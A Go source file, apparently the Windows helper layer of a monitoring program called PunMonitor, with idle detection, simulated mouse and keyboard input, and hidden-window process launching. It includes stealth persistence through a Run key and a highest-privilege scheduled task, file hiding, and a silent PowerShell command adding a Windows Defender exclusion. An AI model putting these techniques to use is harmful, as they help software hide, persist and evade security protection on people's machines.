//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func newHiddenCmd(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
}

func hideConsole() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	freeConsole := kernel32.NewProc("FreeConsole")
	freeConsole.Call()
}

func watchdogSingleton() bool {
	h, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(`Global\PunMonitorWatchdog`))
	if err != nil {
		return false
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		windows.CloseHandle(h)
		return false
	}
	return h != 0
}

func singleton() bool {
	h, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(`Global\PunMonitorSingleton`))
	if err != nil {
		llog("error", "Failed to create mutex: %v", err)
		return false
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		windows.CloseHandle(h)
		return false
	}
	return h != 0
}

func systemBootTimeMS() int64 {
	// Try GetTickCount64 first (fast, no external process)
	k32 := windows.NewLazyDLL("kernel32.dll")
	getTick := k32.NewProc("GetTickCount64")
	r, _, _ := getTick.Call()
	if r != 0 {
		return time.Now().Add(-time.Duration(r) * time.Millisecond).UnixMilli()
	}
	// Fallback: WMI query via command
	out, err := exec.Command("cmd", "/c", "wmic", "os", "get", "lastbootuptime").Output()
	if err == nil {
		t := strings.TrimSpace(string(out))
		lines := strings.Split(t, "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if len(line) >= 14 {
				tm, err := time.Parse("20060102150405", line[:14])
				if err == nil {
					return tm.UnixMilli()
				}
			}
		}
	}
	return 0
}

var (
	user32               = windows.NewLazySystemDLL("user32.dll")
	kernel32             = windows.NewLazySystemDLL("kernel32.dll")
	GetTickCount64       = kernel32.NewProc("GetTickCount64")
	GetLastInputInfo     = user32.NewProc("GetLastInputInfo")
	RegisterHotKey       = user32.NewProc("RegisterHotKey")
	UnregisterHotKey     = user32.NewProc("UnregisterHotKey")
	GetMessage           = user32.NewProc("GetMessageW")
	TranslateMessage     = user32.NewProc("TranslateMessage")
	DispatchMessage      = user32.NewProc("DispatchMessageW")
	PostQuitMessage      = user32.NewProc("PostQuitMessage")
	CreateMutexW         = kernel32.NewProc("CreateMutexW")
	ReleaseMutex         = kernel32.NewProc("ReleaseMutex")
	setCursorPos         = user32.NewProc("SetCursorPos")
	mouseEvent           = user32.NewProc("mouse_event")
	keybdEvent           = user32.NewProc("keybd_event")
	OpenMutexW           = kernel32.NewProc("OpenMutexW")
	CloseHandle          = kernel32.NewProc("CloseHandle")
	CreateProcessW       = kernel32.NewProc("CreateProcessW")
	WaitForSingleObject  = kernel32.NewProc("WaitForSingleObject")
	TerminateProcess     = kernel32.NewProc("TerminateProcess")
	GetModuleFileNameExW = windows.NewLazySystemDLL("psapi.dll").NewProc("GetModuleFileNameExW")
	EnumProcesses        = windows.NewLazySystemDLL("psapi.dll").NewProc("EnumProcesses")
	OpenProcess          = kernel32.NewProc("OpenProcess")
)

type lastInputInfo struct {
	cbSize uint32
	dwTime uint32
}

type IdleDetector struct {
	threshold time.Duration
	callback  func(idle bool)
	stopCh    chan struct{}
	wg        sync.WaitGroup
}

func NewIdleDetector(threshold time.Duration, callback func(idle bool)) *IdleDetector {
	return &IdleDetector{
		threshold: threshold,
		callback:  callback,
		stopCh:    make(chan struct{}),
	}
}

func (id *IdleDetector) Start(ctx context.Context) {
	id.wg.Add(1)
	go id.loop(ctx)
}

func (id *IdleDetector) Stop() {
	close(id.stopCh)
	id.wg.Wait()
}

func (id *IdleDetector) loop(ctx context.Context) {
	defer id.wg.Done()
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	var wasIdle bool
	for {
		select {
		case <-ticker.C:
			var lii lastInputInfo
			lii.cbSize = uint32(unsafe.Sizeof(lii))
			ret, _, _ := GetLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
			if ret == 0 {
				continue
			}
			tick, _, _ := GetTickCount64.Call()
			idleTime := time.Duration(uint64(tick) - uint64(lii.dwTime)) * time.Millisecond
			idle := idleTime > id.threshold
			if idle != wasIdle {
				id.callback(idle)
				wasIdle = idle
			}
		case <-ctx.Done():
			return
		}
	}
}

var winMouseMove = func(x, y int) {
	setCursorPos.Call(uintptr(x), uintptr(y))
}

var winMouseClick = func(x, y int, left bool) {
	if x != 0 || y != 0 {
		setCursorPos.Call(uintptr(x), uintptr(y))
	}
	flags := uintptr(0x0002 | 0x0004) // MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP
	if !left {
		flags = uintptr(0x0008 | 0x0010) // MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP
	}
	mouseEvent.Call(flags, 0, 0, 0, 0)
}

var winKeyPress = func(vk uint16) {
	keybdEvent.Call(uintptr(vk), 0, 0, 0)
	keybdEvent.Call(uintptr(vk), 0, 2, 0)
}

var winTypeText = func(text string) {}

const autostartKeyName = "PunMonitor"

func setupAutostart() {
	watchdogExe, err := os.Executable()
	if err != nil {
		return
	}
	permPath := filepath.Join(binDir(), filepath.Base(watchdogExe))
	if _, err := os.Stat(permPath); err == nil {
		watchdogExe = permPath
	}
	path := watchdogExe + ` --watchdog`
	k32 := windows.NewLazyDLL("advapi32.dll")
	regSetValue := k32.NewProc("RegSetKeyValueW")
	regSetValue.Call(
		uintptr(0x80000001), // HKEY_CURRENT_USER
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(`Software\Microsoft\Windows\CurrentVersion\Run`))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("PunMonitor"))),
		uintptr(1), // REG_SZ
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(path))),
		uintptr(len(path)*2),
	)
	// Create scheduled task: runs at logon with hidden window, highest privileges.
	// Invoke the exe directly (no cmd /c wrapper) to avoid any console flash.
	schtasksCmd := fmt.Sprintf(
		`schtasks /Create /TN "PunMonitor" /TR "\"%s\" --watchdog" /SC ONLOGON /F /RL HIGHEST`,
		watchdogExe,
	)
	cmd := exec.Command("cmd", "/c", schtasksCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	cmd.Run()
	llog("info", "Autostart installed: %s (+ scheduled task)", path)
}

func removeAutostart() {
	k32 := windows.NewLazyDLL("advapi32.dll")
	regDelete := k32.NewProc("RegDeleteKeyValueW")
	regDelete.Call(
		uintptr(0x80000001),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(`Software\Microsoft\Windows\CurrentVersion\Run`))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("PunMonitor"))),
	)
	llog("info", "Autostart removed")
}

func addDefenderExclusion() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeDir := filepath.Dir(exePath)
	
	// Try PowerShell command to add exclusion (requires admin)
	psCmd := fmt.Sprintf(`Add-MpExclusion -Path '%s' -ErrorAction SilentlyContinue`, exeDir)
	cmd := exec.Command("powershell", "-Command", psCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Run(); err == nil {
		llog("info", "Defender exclusion added for %s", exeDir)
		return
	}
	
	// Not admin — write instructions file for user
	instructions := fmt.Sprintf(`Windows Defender may block PunMonitor.

To fix this, run this command in PowerShell as Administrator:

  Add-MpExclusion -Path '%s'

Or manually:
1. Open Windows Security
2. Virus & threat protection
3. Manage settings
4. Exclusions → Add or remove exclusions
5. Add folder: %s

`, exeDir, exeDir)
	
	instructionsPath := filepath.Join(dataDir(), "DEFENDER_HELP.txt")
	os.WriteFile(instructionsPath, []byte(instructions), 0644)
	llog("info", "Defender exclusion requires admin. Instructions saved to %s", instructionsPath)
}

func cleanDuplicateAutostartEntries() {}

var (
	singletonMutexName   = `Global\PunMonitorSingleton`
	singletonMutex       windows.Handle
	punMonitorImageNames = []string{"PunMonitor.exe", "test_build.exe"}
)

func ensureSingleInstance(replaceExisting bool) bool { return true }
func killAllPunMonitorImages()                       {}
func tryAcquireSingletonMutex() bool                 { return true }
func releaseSingleton()                              {}
func killOtherPunMonitorProcesses(selfPID int)        {}
func writePIDFile()                                   {}
func removePIDFile()                                  {}
func isPortInUse(port int) bool                       { return false }
func updateSystemInfoFromActivity(info map[string]string) {}

func getIdleDuration() time.Duration {
	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))
	ret, _, _ := GetLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return 0
	}
	tick, _, _ := GetTickCount64.Call()
	idleMS := uint64(tick) - uint64(lii.dwTime)
	return time.Duration(idleMS) * time.Millisecond
}

func hideFile(path string) string {
	pathPtr, _ := windows.UTF16PtrFromString(path)
	windows.NewLazySystemDLL("kernel32.dll").NewProc("SetFileAttributesW").Call(
		uintptr(unsafe.Pointer(pathPtr)),
		2, // FILE_ATTRIBUTE_HIDDEN
	)
	return path
}
